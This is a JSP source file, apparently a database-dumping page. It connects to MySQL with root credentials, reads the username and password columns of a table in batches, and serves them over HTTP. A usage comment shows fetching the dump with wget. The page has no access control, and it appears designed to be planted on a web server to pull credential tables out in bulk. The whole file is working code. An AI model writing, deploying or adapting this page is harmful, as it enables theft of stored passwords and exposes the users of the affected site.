<%@ page contentType="text/html; charset=utf-8" %>
<%@ page language="java" %>
<%@ page import="java.sql.*" %>

<%
//author: By Gavin
//Usage: wget "http://xxx.com/wget_db.jsp?sn=0&en=5000000&ln=50000" -O gavin.sql

out.clear();
//分段每次limit查询出来的条数,根据实际情况调整，默认为2w
int MAX_LIMIT_NUM =  20000;
//最大缓存条数，防止占用过多内存，根据每条数据大小调整  
int MAX_CACHE_NUM = 5000;

//驱动程序名
String driverName="com.mysql.jdbc.Driver";
// 数据库地址
String dbAddress = "127.0.0.1:3306";
//数据库用户名
String userName="root";
//密码
String userPasswd="root";
//数据库名
String dbName="DBName";
// 查询字段
String columns[] = "username,password".split(",");
//表名
String tableName="table_name";

// 接受参数
int startNum = Integer.valueOf(request.getParameter("sn"));      //接收起始条数
int endNum = Integer.valueOf(request.getParameter("en"));      //接收结束条数
String ln = request.getParameter("ln");
if (ln != null && ln != "")  MAX_LIMIT_NUM = Integer.valueOf(ln);  //接收每次分段查询的条数
 int gavin_downNum = endNum - startNum;                  //计算总下载条数

if (endNum < MAX_LIMIT_NUM) MAX_LIMIT_NUM = endNum;
int multiple = gavin_downNum/MAX_LIMIT_NUM;
int complement = gavin_downNum%MAX_LIMIT_NUM;

// 连接数据库
String url="jdbc:mysql://"+dbAddress+"/"+dbName+"?user="+userName+"&password="+userPasswd;
 Class.forName(driverName).newInstance();
Connection connection=DriverManager.getConnection(url);
Statement statement = connection.createStatement();

// 拼装前半部分sql
String sql = "SELECT ";
for(int i=0;i<columns.length;i++){
  if(i == (columns.length-1)){
    sql += columns[i];
  } else {
    sql += columns[i] + ",";
  }
}
sql += " FROM " + tableName + " ";

int num = 1;

for(int i=0;i<multiple;i++) {
  int newStartNum = i*MAX_LIMIT_NUM+startNum;
  if(i == (multiple-1)) MAX_LIMIT_NUM += complement;
  String newSql = sql + " limit " + newStartNum + "," + MAX_LIMIT_NUM;
  java.sql.ResultSet rs = statement.executeQuery(newSql);
  //获得数据结果集合
  //ResultSetMetaData rmeta = rs.getMetaData();
  while(rs.next()) {
    num ++;
    for(int j=1;j<=columns.length;j++){
      if(j == columns.length){
        out.println(rs.getString(j));
      } else {
        out.print(rs.getString(j)+"-->");
      }
    }
    if (num >= MAX_CACHE_NUM) {
      out.flush();
      num = 0;
    }
  }
  rs.close();
}
statement.close();
connection.close();
%>